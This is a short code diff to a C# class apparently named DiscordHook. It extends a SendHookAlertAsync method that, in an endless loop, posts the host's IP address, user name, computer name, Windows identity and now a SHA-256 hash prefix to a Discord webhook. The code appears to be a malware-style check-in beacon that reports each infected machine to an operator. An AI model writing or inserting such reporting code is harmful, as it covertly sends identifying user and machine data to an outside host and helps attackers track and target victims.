@@ -22,7 +22,7 @@ namespace DiscordHook
             }
         }
 
-        public static async Task SendHookAlertAsync(string ip, string dshook)
+        public static async Task SendHookAlertAsync(string ip, string dshook, string hashprefix)
         {
             while (true)
             {
@@ -30,7 +30,8 @@ namespace DiscordHook
                 {
                     await new HttpClient().PostAsync(dshook, new FormUrlEncodedContent(new Dictionary<string, string>{
                         {"content", $"```IP: {ip}\nSession name: {Environment.UserName}\n" +
-                                    $"Computer name: {Environment.MachineName}```"},
+                                    $"Computer name: {Environment.MachineName}\n" +
+                                    $"Sha256 hash: {hashprefix}```"},
                         {"username", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
                         {"avatar_url", "https://cdn.discordapp.com/attachments/785419281135042564/854132950098903050/d225266ddff6e8d7dc387d671704308c.png"}
                     }));
